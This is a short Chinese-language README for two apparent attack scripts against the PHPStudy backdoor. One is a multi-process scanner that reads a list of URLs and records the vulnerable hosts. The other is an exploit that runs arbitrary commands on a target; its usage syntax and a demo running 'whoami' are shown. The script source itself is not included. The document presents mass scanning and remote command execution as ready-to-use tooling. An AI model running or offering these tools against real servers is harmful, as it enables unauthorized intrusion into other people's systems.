# PHPStudy_BackDoor

### phpstudy_backdoor_poc.py
	多进程批量检测脚本，自动读取urls.txt中内容，然后进行批量检测
	检测结果如发现漏洞会存入phpstudy_backdoor_urls.txt中

##### 运行demo：
```
python phpstudy_backdoor_poc.py

[+] http://127.0.0.1 is vulnerable.
[-] http://192.168.1.1 is invulnerable.
[*] http://192.168.1.2 Looks Like Something Wrong.
[*] http://192.168.1.3 Looks Like Something Wrong.
```

### phpstudy_backdoor_exp.py
	漏洞利用脚本，操作精简。
	Usage: python3 phpstudy_backdoor_exp.py [url] [command]

##### 运行demo：
```
python phpstudy_backdoor_exp.py 127.0.0.1 whoami

[+] Command Execute Successful.
rabbitmask\rabbitmask
```

